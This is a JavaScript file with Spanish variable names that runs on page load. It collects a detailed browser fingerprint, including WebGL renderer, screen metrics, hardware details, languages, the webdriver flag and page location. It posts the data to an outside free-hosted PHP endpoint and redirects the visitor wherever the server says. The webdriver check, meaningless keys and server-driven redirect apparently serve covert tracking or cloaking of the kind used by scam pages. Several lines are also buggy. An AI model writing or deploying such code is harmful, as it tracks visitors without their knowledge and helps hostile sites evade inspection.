function EnviarData(){
    
    let navegar;
    if('typeof InstallTrigger' !== 'undefined'){
    navegar = 'firefox';
}else if (window.chrome && typeof window.chrome === 'object'&& !window.StyleMedia){
    navegar = 'chrome u optro';
}else if ("-webkit-transform" in div.style){
    navegar = 'chrome u optro';
}else if (window.outerHeight - window.innerHeight > 100){
    navegar = 'chrome u optro';
}
    let rendererr;
    let vendorr;
    let gl1;
    let canvase;
    document.addEventListener("DOMContentLoaded", () => {
    canvase = document.getElementById('cn');

    if(!canvase){
        alert(1445584 + 17e4);
    }

    gl1 = canvase.getContext("webgl");
    if(gl1){
        
    }
    const debugInfo1 = gl1.getExtension("WEBGL_debug_renderer_info");
    if(!debugInfo1){
        alert(2554*565645645);
    }
    vendorr = gl1.getParameter(debugInfo1.UNMASKED_VENDOR_WEBGL);
    rendererr = gl1.getParameter(debugInfo1.UNMASKED_RENDERER_WEBGL);
})
    //Datos innecesarios arriba
    let renderer;
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext(experimental-webgl);
    if(gl){
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
         renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        //console.log(vendor, renderer);
        //alert(renderer);
    }



    let bateria1 = 'no tiene';
    if(navigator.battery || navigator.getBattery){
        bateria1 = 'tiene';
    }else if(navigator.userAgent.includes('iPhone')){
        bateria1 = 'tiene';
    }
    let touch1 = 'no';
    if('ontouchstart' in window){
        touch1 = 'si';
    }
    return{
        sadica: navigator.languages,
        grafica: renderer,
        gtv: rendererr,
        bateria: bateria1,
        navegador: navegar,
        driver: navigator.webdriver,
        touch: touch1,
        ancho: window.screen.width,
        alto: window.screen.height,
        see: vendorr,
        maxtoque: navigator.maxTouchPoints,
        fefe: gl1,
        wef: canvase,
        plataforma: navigator.platform,
        ram: navigator.deviceMemory,
        nucleos: navigator.hardwareConcurrency,
       // ere: navigator.locks,
        skff: navigator.webdriver,
        //weirvn: navigator.geolocation,
        rviurvn: window.location,
        iefubeurif: window.scrollY,
        iurnf: window.screenTop,
        rfeerwf: window.scrollbars,
        vrfre: window.screenLeft,
       // eerf: window.sessionStorage,
        eofro: window.scrollX,
      //  irnfrio: window.frames
    };
}

window.addEventListener("load", () => {
    
    const browserData = EnviarData();
    
    fetch("http://eygfuibb.wuaze.com/controlador.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        }, 
              body: JSON.stringify(browserData)
            })
            .then(response => response.json())
            .then(data => {
                if(data.redirect){
                    window.location.href = data.url;
                }
                console.log("respesta", data);
            })
            .catch(error => {
                console.error('error', error);
            });
});
